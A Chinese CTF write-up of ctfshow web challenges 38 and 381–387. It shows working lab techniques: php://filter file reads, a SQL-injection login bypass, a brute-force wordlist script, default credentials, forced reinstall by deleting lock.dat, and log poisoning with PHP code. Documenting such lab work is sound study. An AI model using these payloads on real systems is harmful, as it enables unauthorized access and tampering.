## 前言
```
这周在准备国赛半决赛的awd，所以没怎么学web，一直在研究awd。
做了几道ctfshow的题。
```
## web38
查看网页源代码

![图片](https://user-images.githubusercontent.com/81904597/119258090-d255f980-bbfa-11eb-82be-de2002b1fdbd.png)

能看到一个page_3.php的注释，看了一圈没看到什么东西，索性直接访问page.php

![图片](https://user-images.githubusercontent.com/81904597/119258098-daae3480-bbfa-11eb-857b-216b180506fc.png)

那就直接访问

```
page.php?id=1
```
![图片](https://user-images.githubusercontent.com/81904597/119258107-e13cac00-bbfa-11eb-8556-11a42ab3fd7f.png)
waring弹出，是使用file_get_contents读取文件，我们将1改为index发现直接返回了主页,那我们可以尝试读取有没有flag文件

```
page.php?id=flag
```
![图片](https://user-images.githubusercontent.com/81904597/119258118-eac61400-bbfa-11eb-815f-8f5175553f83.png)



```
file_get_contents

(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)

file_get_contents — 将整个文件读入一个字符串

```

因为使用了file_get_contents，所以我们可以使用php伪协议来读取代码

```
page.php?id=php://filter/convert.base64-encode/resource=index
```

![图片](https://user-images.githubusercontent.com/81904597/119258128-f7e30300-bbfa-11eb-89a1-741153c4a2c7.png)

同样也可以读取flag文件

```
page.php?id=php://filter/convert.base64-encode/resource=flag
```

## web381

​	查看源代码，按照上一题的方法发现做不出，但是发现了一个alsckdfy经过测试是后台的地址。

![图片](https://user-images.githubusercontent.com/81904597/119258135-016c6b00-bbfb-11eb-9aed-78f8da44f63f.png)

```
/alsckdfy/(这里注意路由的写法)
```

题目的本意也是让我们找到后台的地址(这才是黑盒测试的本质)
![图片](https://user-images.githubusercontent.com/81904597/119258144-08937900-bbfb-11eb-81dd-de2449139f70.png)

## web382

后台弱口令，登录获得flag

```
admin 'or '1'='1
密码随意
```

## web383

解题思路与382一样

## web384

![图片](https://user-images.githubusercontent.com/81904597/119258148-0e895a00-bbfb-11eb-9d9a-91c18dc6ae2f.png)

题目提示前三位是小写字母，后三位是数字，所以题目的本意就是让我们爆破密码呗

后序一定补！

```python
length = 5
charLength = 2
char = 'abcdefghijklmnopqrstuvwxyz'

def formatNum(n):
    global length
    return '0'*(length-charLength-len(str(abs(n))))+str(abs(n))[:length-charLength]

string = ''
for n in char:
    for c in char:
        for i in range(pow(10,length-charLength)):
            string += n+c+formatNum(i)+'\n'

with open('dict.txt','w') as f:
    f.write(string)

```

burp跑一下字典得到密码为xy123

## web385

访问

```
http://e9bdf733-b2a1-4b5f-bfe0-df3cf7798266.challenge.ctf.show:8080/install/
```

![图片](https://user-images.githubusercontent.com/81904597/119258152-15b06800-bbfb-11eb-8826-35e39fa179bf.png)

根据提示

```
http://e9bdf733-b2a1-4b5f-bfe0-df3cf7798266.challenge.ctf.show:8080/install/?install
```

![图片](https://user-images.githubusercontent.com/81904597/119258167-29f46500-bbfb-11eb-8ea7-b2aa082fbd1e.png)

在访问后台登录页面,用原密码 admin admin888

登录获得flag

## web386

按照上一题，接着访问install
![图片](https://user-images.githubusercontent.com/81904597/119258176-337dcd00-bbfb-11eb-9b70-9f1d1b488eb7.png)

提示lock.dat存在无法重复安装，所以我们要尝试将lock.dat删除掉

经过扫描发现了存在一个clear.php,那肯定是用这个clear.php来删除文件，盲猜一波file参数

```
http://ed902854-7a20-47d6-b1bd-589fee68e5df.challenge.ctf.show:8080/clear.php?file=/var/www/html/install/lock.dat
```

![图片](https://user-images.githubusercontent.com/81904597/119258192-3d9fcb80-bbfb-11eb-9173-418358f249f7.png)

接着就到了上一题的步骤

登录即可

## web387

开局给了一个提示

![图片](https://user-images.githubusercontent.com/81904597/119258197-47293380-bbfb-11eb-8353-cbc5b897fd13.png)

经过尝试发现不可以。

访问一下robots.txt,发现/debug

![图片](https://user-images.githubusercontent.com/81904597/119258205-4bede780-bbfb-11eb-994d-6ce3e2b769c9.png)

访问一下
![图片](https://user-images.githubusercontent.com/81904597/119258213-51e3c880-bbfb-11eb-87c9-73e09bbd72ef.png)

提示file not exist,那直接file一个文件

![图片](https://user-images.githubusercontent.com/81904597/119258215-560fe600-bbfb-11eb-88df-4f65daa8816a.png)

那肯定也可以包含日志文件，尝试传入一句话失败了，原因是没有接受Post的值，也就是说他可以执行传入的东西，只是不接受，那直接传入php的代码将lock.dat删掉

```php
<?php unlink('/var/www/html/install/lock.dat')?>
```



![图片](https://user-images.githubusercontent.com/81904597/119258220-5b6d3080-bbfb-11eb-9747-f015dd0df369.png)

包含一下日志文件让他执行

![图片](https://user-images.githubusercontent.com/81904597/119258228-64f69880-bbfb-11eb-8c99-a942bc56df58.png)

然后访问install发现执行成功
![图片](https://user-images.githubusercontent.com/81904597/119258234-69bb4c80-bbfb-11eb-85a3-a160d23419f6.png)

登陆获得flag











